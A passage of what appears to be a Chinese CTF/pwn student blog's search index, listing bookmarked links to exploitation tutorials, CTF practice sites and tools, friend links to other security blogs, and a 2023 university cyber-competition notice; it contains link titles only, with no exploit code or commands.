-c\n```\n\n","categories":["CVE"],"tags":["CVE"]},{"title":"about","url":"/about/index.html","content":""},{"title":"导航","url":"/daohang/index.html","content":"\n# 学习资料\n\n[西电文档在线版](https://www.wenjiangs.com/doc/qlkg1aykwf)\n\n[CookedMelon/Pwn-in-practice: 记录学习pwn的笔记和遇到的题目](https://github.com/CookedMelon/Pwn-in-practice)\n\n# 还没看的WP\n\n[官方Write Up｜DASCTF六月赛 · 二进制专项 | CTF导航](https://www.ctfiot.com/118808.html)\n\n# 工具\n\n[awd pwn通防小工具](https://blog.csdn.net/qq_45595732/article/details/125472253)\n\n[masscan扫描端口](https://blog.csdn.net/weixin_51730169/article/details/124627178)\n\n[AabyssZG/AWD-Guide: AWD比赛指导手册和脚本整理](https://github.com/AabyssZG/AWD-Guide)\n\n[CTF-pwn pwntools用法探索](https://www.xjx100.cn/news/262545.html?action=onClick)\n\n[Index of /ubuntu-releases/ | 清华大学开源软件镜像站 ](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/)\n\n# CTF工具站：\n\n[在线工具](http://www.hiencode.com/)\n\n[CTF站点导航](https://ctf.mzy0.com/)\n\n[MD5碰撞](https://www.somd5.com/)\n\n# CTF刷题/比赛站\n\n[攻防世界](https://adworld.xctf.org.cn/home/index?rwNmOdr=1686891778736)\n\n[BUU](https://buuoj.cn/)\n\n[DataCon](https://datacon.qianxin.com/competition/competitions/53/introductionhttps://datacon.qianxin.com/competition/competitions/53/introduction)\n\n[PolarD&N](https://polarctf.com/#/page/convert)\n\n[ACTF](https://adworld.xctf.org.cn/match/list?event_hash=706a7a8c-65a0-11ee-ab28-000c29bc20bf)\n\n# 堆\n\n[Tcache bin](https://blog.csdn.net/A951860555/article/details/115442780)\n\n[ctfwiki](https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack.md)\n\n[hook](https://blog.csdn.net/A951860555/article/details/115766826)\n\n[pwn | 堆结构](https://www.cnblogs.com/Mz1-rc/p/17023153.html)\n\n[Unsortedbin Attack ](https://www.52pojie.cn/thread-1467962-1-1.html)\n\n[House of orange ](https://www.wenjiangs.com/doc/6ki1sx0l)\n\n[house of orange](https://blog.csdn.net/aptx4869_li/article/details/122971995)2\n\n[House of orange 3](https://www.wenjiangs.com/doc/6ki1sx0l#EXPlb2.2)\n\n# SROP\n\n[系统调用号](https://blog.csdn.net/winter2121/article/details/119845443)\n\n[Linux SROP 原理与攻击](https://blog.csdn.net/qq_31481187/article/details/73929569)\n\n[[syscall系统调用的简单分析](https://baijiahao.baidu.com/s?id=1658134769561601465&wfr=spider&for=pc)g)\n\n# IOlife\n\n[浅析IOFILE结构及利用](https://blog.csdn.net/w12315q/article/details/84328447)\n\n[HCTF2018 the_end&&babyprintf_var2 Writeup - 知乎](https://zhuanlan.zhihu.com/p/49773291)\n\n[好好说话之IO_FILE利用（1](https://blog.csdn.net/qq_41202237/article/details/113845320)\n\n# C++\n\n[例题1](https://mp.weixin.qq.com/s/Tcu45BJj3JTqD0Pvw1HYng)\n\n# 其他\n\n[Linux学习](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzI5MDk3NTAxNw==&scene=23&album_id=3033094806944350211&count=3#wechat_redirect)\n\n[命令绕过](https://www.yii666.com/blog/338731.html)\n\n[[原创\\]关于不同版本 glibc 更换的一些问题-](https://bbs.kanxue.com/thread-254868.htm)\n\n# 大创\n\n[结题报告 - 列表 | 西北工业大学大学生创新创业训练计划项目管理系统](https://cxcy.nwpu.edu.cn/XM/JieTi/Declare/Index)\n\n[三航杯](https://www.sanhangcup.com/#/student/information)\n\n# 学习无关\n\n## 我的世界\n\n[2022年最新Minecraft村民的职业与交易详解指南](https://baijiahao.baidu.com/s?id=1724382693956990325&wfr=spider&for=pc)\n\n[我的世界药水配方大全2023 最新常用药水配方汇总-骑士助手](https://www.vqs.com/article/10022.html)\n\n[我的世界药水合成表大全 药水合成配方图表汇总_历趣](https://www.liqucn.com/article/270749.shtml)\n\n## 数模\n\n[速成 | 遗传算法详解及其MATLAB实现|代数|算子|matlab_网易订阅](https://www.163.com/dy/article/I6VDJTPR05530N05.html)\n\n## 不知道什么时候想看的剧\n\n[间谍过家家 第二季第01集高速①免费在线播放 - 谍战迷](http://www.diezhanba.me/dongman/jiandieguojiajia_dierji/play-0-0.html)\n"},{"title":"友链","url":"/links/index.html","content":"\n# 我的\n\n[ChatGPT](https://www.gpt.heshi906.xyz/)\n\n[NPUSEC_GitLab](https://git.qwq.cc/npusec2022)\n\n[NPU::CTF](https://ctf.qwq.cc/)\n\n[主页 | AList](http://10.81.2.230:5244/)\n\n# 大师傅们\n\n[xiong's blog - 心血来潮的产物捏～](https://1145.link/)熊神！懂得都懂\n\n[Jelasin](https://jelasin.github.io/) IoT\n\n[korey0sh1](https://korey0sh1.cn/) IoT 人民公安大爹\n\n[TokameinE](https://tokameine.top/) PWN大爹\n\n[Nameless](https://nameless.top/) DAS出题人 IOT大爹\n\n[z1r0's blog](https://www.z1r0.top/) IOT爹\n\n[lewiserii's blog](https://lewiserii.github.io/) 全栈爹，护网，渗透，各种工具，偏web\n\n"},{"title":"近期比赛","url":"/games/index.html","content":"\n# “古剑山\"第一届全国大学生网络攻防大赛初赛\n\n比赛链接: https://www.cqyti.com/info/1143/390372.htm\n\n比赛类型:团队赛|1-3人\n\n报名开始:2023年09月15日18:00:00\n\n报名截止:2023年11月08日18:00:00\n\n比赛开始:2023年12月08日09:00:00\n\n比赛结束:2023年12月08日12:00:00\n\nQQ群:792721897\n\n"}]